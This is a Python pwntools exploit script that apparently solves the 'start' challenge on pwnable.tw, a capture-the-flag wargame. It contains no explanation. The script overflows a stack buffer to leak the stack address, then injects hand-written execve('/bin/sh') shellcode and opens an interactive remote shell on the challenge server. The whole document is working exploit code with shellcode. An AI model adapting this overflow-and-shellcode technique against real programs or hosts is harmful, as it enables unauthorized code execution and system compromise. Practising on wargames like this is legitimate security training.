from pwn import *

sh = remote('chall.pwnable.tw', 10000)
# sh = process('./pwnable.tw_start.assets/start')
# sh = gdb.debug('./pwnable.tw_start.assets/start', '''
# b *08048060
# continue
# ''')

sh.recvuntil(b'Let\'s start the CTF:')
sh.send(b'A' * 20 + p32(0x8048087))

recv = sh.recv(4)
esp_addr = u32(recv)
print(recv.hex())

asm_code = '''
    push 6845231    /* 682f736800 */
    push 1852400175
    xor edx, edx
    xor ecx, ecx
    mov ebx, esp
    mov eax, 0xb
    int 0x80
'''

print(len(asm(asm_code)))
print(asm(asm_code).hex())
ret_addr = esp_addr - 0x4 + 0x14 + 0x4

shellcode = b'A' * 20 + p32(ret_addr) + asm(asm_code)
print(len(shellcode))
print(shellcode.hex())

sh.sendline(shellcode)
sh.interactive()
